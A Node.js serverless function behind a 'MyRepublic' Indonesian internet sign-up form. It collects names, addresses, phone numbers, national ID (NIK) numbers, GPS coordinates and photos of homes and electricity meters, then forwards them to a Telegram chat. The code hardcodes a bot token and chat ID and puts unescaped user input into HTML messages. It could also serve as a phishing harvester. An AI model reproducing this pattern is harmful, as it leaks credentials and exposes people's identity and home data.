const FormData = require('form-data');
const fetch = require('node-fetch');
const busboy = require('busboy');

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8602067767:AAHf0GGV-ynaQoHPxwFQ4n5WYAa7srPuEek';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '275358017';

function formatIndonesiaTime() {
    const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
    const months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
    
    const now = new Date();
    const day = days[now.getDay()];
    const date = now.getDate();
    const month = months[now.getMonth()];
    const year = now.getFullYear();
    let hours = now.getHours();
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const ampm = hours >= 12 ? 'malam' : 'pagi';
    hours = hours % 12 || 12;
    
    return `${day}, ${date} ${month} ${year} pukul ${hours}.${minutes} ${ampm}`;
}

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ success: false, message: 'Method not allowed' })
        };
    }

    try {
        const fields = {};
        const files = {};
        
        await new Promise((resolve, reject) => {
            const bb = busboy({ headers: event.headers });
            
            bb.on('field', (name, value) => {
                fields[name] = value;
            });
            
            bb.on('file', (name, file, info) => {
                const chunks = [];
                file.on('data', (data) => chunks.push(data));
                file.on('end', () => {
                    files[name] = {
                        filename: info.filename,
                        mimeType: info.mimeType,
                        data: Buffer.concat(chunks)
                    };
                });
            });
            
            bb.on('close', resolve);
            bb.on('error', reject);
            bb.end(Buffer.from(event.body, 'base64'));
        });
        
        const { nama, alamat, nohp, email, nik, latitude, longitude } = fields;
        
        if (!nama || !alamat || !nohp || !email || !nik || !latitude || !longitude) {
            return {
                statusCode: 400,
                body: JSON.stringify({ success: false, message: 'Semua field harus diisi termasuk lokasi' })
            };
        }
        
        const waktu = formatIndonesiaTime();
        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        
        const message = `🌐 PENDAFTARAN BARU MYREPUBLIC
━━━━━━━━━━━━━━━━━━━━━━

👤 NAMA
${nama}

📍 ALAMAT PEMASANGAN
${alamat}

📞 NO. HP
${nohp}

📧 EMAIL
${email}

🆔 NIK KTP
${nik}

📌 TITIK KOORDINAT
${latitude}, ${longitude}
🗺 <a href="${mapsLink}">Buka di Google Maps</a>

🕒 WAKTU
${waktu}

━━━━━━━━━━━━━━━━━━━━━━
📸 4 foto dikirim di bawah...`;
        
        await sendTelegramMessage(message);
        
        const fotoFields = ['foto_depan', 'foto_kiri', 'foto_kanan', 'foto_meter'];
        const fotoCaptions = {
            'foto_depan': '📸 FOTO TAMPAK DEPAN RUMAH',
            'foto_kiri': '📸 FOTO SERONG KIRI',
            'foto_kanan': '📸 FOTO SERONG KANAN',
            'foto_meter': '📸 FOTO METERAN LISTRIK'
        };
        
        for (const field of fotoFields) {
            if (files[field] && files[field].data) {
                await sendTelegramPhoto(files[field].data, `${fotoCaptions[field]}\n👤 ${nama}\n🕒 ${waktu}`);
            }
        }
        
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Pendaftaran berhasil dikirim' })
        };
        
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, message: 'Terjadi kesalahan server: ' + error.message })
        };
    }
};

async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    });
    return response.json();
}

async function sendTelegramPhoto(photoBuffer, caption) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', photoBuffer, { filename: 'photo.jpg' });
    formData.append('caption', caption);
    formData.append('parse_mode', 'HTML');
    
    const response = await fetch(url, {
        method: 'POST',
        body: formData
    });
    return response.json();
}